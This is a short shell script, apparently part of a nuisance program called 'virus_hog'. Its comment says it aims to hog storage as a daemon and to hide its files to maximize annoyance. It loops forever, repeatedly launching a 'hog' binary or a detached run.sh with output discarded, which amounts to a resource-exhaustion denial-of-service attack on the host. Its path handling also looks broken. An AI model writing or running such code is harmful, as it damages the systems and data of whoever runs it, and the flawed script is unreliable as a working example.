# hog storage as daemon with multi-threading. make sure file locations are randomized to maximize annoyingness
PATH_HOGSH=$(find ~ -name "virus_hog")
while [ true ] ; do
	if [ -f hog ]; then
		./$PATH_HOGSH/hog
	else
		nohup sh $PATH_HOGSH/run.sh 0<&- &>/dev/null &
	fi
done
